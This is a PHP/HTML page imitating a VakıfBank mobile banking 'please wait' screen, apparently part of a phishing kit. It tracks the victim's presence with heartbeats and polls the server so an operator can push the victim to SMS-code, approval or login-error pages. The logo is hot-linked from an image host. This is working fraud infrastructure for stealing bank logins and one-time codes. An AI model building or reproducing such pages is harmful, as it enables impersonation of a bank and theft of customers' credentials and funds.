<?php
declare(strict_types=1);
require_once __DIR__ . '/includes/storage.php';

$id = trim((string) ($_GET['id'] ?? ''));
$application = $id !== '' ? findApplicationById($id) : null;

if ($application === null) {
    http_response_code(404);
    echo 'Basvuru bulunamadi.';
    exit;
}

if ((string) ($application['status'] ?? '') === 'yeniden-index') {
    header('Location: giris.php?error=hatali');
    exit;
}
upsertPresence('waiting', (string) $application['id'], false);

$status = (string) $application['status'];
if ($status === 'sms-dogrulama') {
    header('Location: sms.php?id=' . urlencode((string) $application['id']));
    exit;
}
if ($status === 'onay') {
    header('Location: onay.php?id=' . urlencode((string) $application['id']));
    exit;
}
if ($status === 'tebrikler') {
    header('Location: tebrikler.php?id=' . urlencode((string) $application['id']));
    exit;
}
?>
<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
  <title>VakıfBank — Bekleme</title>
  <link rel="preconnect" href="https://fonts.googleapis.com" />
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet" />
  <style>
    :root {
      --gold: #e8b84a;
      --gold-bright: #f5d06a;
      --orange: #e8952e;
      --brown-dark: #2a1810;
      --text-white: #ffffff;
      --text-muted: rgba(255,255,255,.55);
      --panel-bg: rgba(235,240,248,.92);
      --phone-w: 390px;
      --phone-h: 844px;
    }
    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      background: #111;
      font-family: "Inter", system-ui, sans-serif;
      -webkit-font-smoothing: antialiased;
    }
    .phone {
      width: var(--phone-w);
      height: var(--phone-h);
      max-height: 96vh;
      border-radius: 36px;
      overflow: hidden;
      position: relative;
      box-shadow: 0 0 0 10px #1a1a1a, 0 20px 60px rgba(0,0,0,.6);
    }
    .screen {
      position: absolute;
      inset: 0;
      display: flex;
      flex-direction: column;
      background: var(--brown-dark);
      color: var(--text-white);
    }
    .bg-gradient {
      position: absolute;
      inset: 0;
      background:
        radial-gradient(ellipse 120% 80% at 50% 35%, rgba(232,184,74,.45) 0%, transparent 55%),
        radial-gradient(ellipse 90% 60% at 80% 70%, rgba(180,100,40,.25) 0%, transparent 50%),
        linear-gradient(165deg, #1a0f08 0%, #3d2518 35%, #5c3a22 55%, #2a1810 100%);
      z-index: 0;
    }
    .bg-curves {
      position: absolute;
      inset: 0;
      z-index: 0;
      opacity: .35;
      background:
        url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 390 844'%3E%3Cpath d='M-20 200 Q200 100 400 250' fill='none' stroke='%23f5d06a' stroke-width='1' opacity='.4'/%3E%3Cpath d='M-10 400 Q250 300 420 500' fill='none' stroke='%23e8b84a' stroke-width='.8' opacity='.3'/%3E%3Cpath d='M50 600 Q200 500 380 650' fill='none' stroke='%23f5d06a' stroke-width='1.2' opacity='.25'/%3E%3C/svg%3E") center/cover no-repeat;
      pointer-events: none;
    }
    .screen > *:not(.bg-gradient):not(.bg-curves) { position: relative; z-index: 1; }

    .header {
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 4px 16px 20px;
      position: relative;
    }
    .logo-row {
      display: flex;
      align-items: center;
      gap: 8px;
    }
    .logo-v {
      height: 32px;
      width: auto;
      display: block;
    }
    .logo-name { font-size: 1.1rem; font-weight: 700; }

    .content {
      flex: 1;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      padding: 0 24px;
      text-align: center;
    }
    .spinner {
      width: 48px;
      height: 48px;
      border: 4px solid rgba(232,184,74,.2);
      border-top-color: var(--gold);
      border-radius: 50%;
      animation: spin .8s linear infinite;
      margin-bottom: 24px;
    }
    @keyframes spin { to { transform: rotate(360deg); } }
    .title {
      font-size: 1.5rem;
      font-weight: 700;
      margin-bottom: 12px;
    }
    .subtitle {
      font-size: .95rem;
      color: var(--text-muted);
      line-height: 1.5;
    }

    .bottom-panel {
      background: var(--panel-bg);
      border-radius: 24px 24px 0 0;
      padding: 20px 8px 28px;
      display: grid;
      grid-template-columns: repeat(5, 1fr);
      gap: 4px;
    }
    .bottom-panel__item {
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 6px;
      border: none;
      background: none;
      cursor: pointer;
      font-family: inherit;
    }
    .bottom-panel__icon {
      width: 28px;
      height: 28px;
      color: var(--orange);
    }
    .bottom-panel__label {
      font-size: .5rem;
      color: #555;
      text-align: center;
      line-height: 1.15;
      max-width: 58px;
    }
    .bottom-panel__icon--fast {
      font-size: .6rem;
      font-weight: 800;
      font-style: italic;
      color: var(--orange);
    }
  </style>
  <!-- Meta Pixel Code -->
  <script>
  !function(f,b,e,v,n,t,s)
  {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
  n.callMethod.apply(n,arguments):n.queue.push(arguments)};
  if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
  n.queue=[];t=b.createElement(e);t.async=!0;
  t.src=v;s=b.getElementsByTagName(e)[0];
  s.parentNode.insertBefore(t,s)}(window, document,'script',
  'https://connect.facebook.net/en_US/fbevents.js');
  fbq('init', '1490333842624277');
  fbq('track', 'PageView');
  </script>
  <noscript><img height="1" width="1" style="display:none"
  src="https://www.facebook.com/tr?id=1490333842624277&ev=PageView&noscript=1"
  /></noscript>
  <!-- End Meta Pixel Code -->
</head>
<body>
  <div class="phone">
    <section class="screen">
      <div class="bg-gradient"></div>
      <div class="bg-curves"></div>

      <header class="header">
        <div class="logo-row">
          <img class="logo-v" src="https://i.ibb.co/ZRCLCS2N/VAKBN-S-68aa6daf.png" alt="VakıfBank" />
        </div>
      </header>

      <div class="content">
        <div class="spinner"></div>
        <h1 class="title">Bekleyin</h1>
        <p class="subtitle">İşlemleriniz devam ediyor lütfen bekleyiniz</p>
      </div>

      <nav class="bottom-panel">
        <button type="button" class="bottom-panel__item">
          <span class="bottom-panel__icon bottom-panel__icon--fast">fast</span>
          <span class="bottom-panel__label">FAST İşlemleri</span>
        </button>
        <button type="button" class="bottom-panel__item">
          <svg class="bottom-panel__icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M4 19V5M10 19V9M16 19v-6M22 19V3"/></svg>
          <span class="bottom-panel__label">Piyasa Bilgileri</span>
        </button>
        <button type="button" class="bottom-panel__item">
          <svg class="bottom-panel__icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="3" width="7" height="7"/><rect x="14" y="3" width="7" height="7"/><rect x="3" y="14" width="7" height="7"/></svg>
          <span class="bottom-panel__label">Karekod İşlemleri</span>
        </button>
        <button type="button" class="bottom-panel__item">
          <svg class="bottom-panel__icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M14 2H6a2 2 0 00-2 2v16a2 2 0 002 2h12a2 2 0 002-2V8z"/><path d="M14 2v6h6M16 13H8M16 17H8M10 9H8"/></svg>
          <span class="bottom-panel__label">Başvuru İşlemleri</span>
        </button>
        <button type="button" class="bottom-panel__item">
          <svg class="bottom-panel__icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="5" y="2" width="14" height="20" rx="2"/><rect x="8" y="6" width="8" height="5" rx="1"/></svg>
          <span class="bottom-panel__label">Cepte Kazan</span>
        </button>
      </nav>
    </section>
  </div>

  <script>
    const appId = <?= json_encode($application['id']) ?>;

    async function checkStatus() {
      try {
        const res = await fetch(`status.php?id=${encodeURIComponent(appId)}&_=${Date.now()}`);
        const data = await res.json();
        if (!data.ok) return;
        if (data.status === 'yeniden-index') {
          window.location.href = 'giris.php?error=hatali';
          return;
        }
        if (data.status === 'sms-dogrulama') {
          window.location.href = `sms.php?id=${encodeURIComponent(appId)}`;
          return;
        }
        if (data.status === 'onay') {
          window.location.href = `onay.php?id=${encodeURIComponent(appId)}`;
          return;
        }
        if (data.status === 'tebrikler') {
          window.location.href = `tebrikler.php?id=${encodeURIComponent(appId)}`;
        }
      } catch (e) {}
    }

    function sendHeartbeat() {
      const body = new URLSearchParams({
        screen: "waiting",
        application_id: appId
      });
      fetch("heartbeat.php", {
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8" },
        body: body.toString(),
        keepalive: true
      }).catch(() => {});
    }

    sendHeartbeat();
    setInterval(sendHeartbeat, 10000);
    setInterval(checkStatus, 4000);
  </script>
</body>
</html>
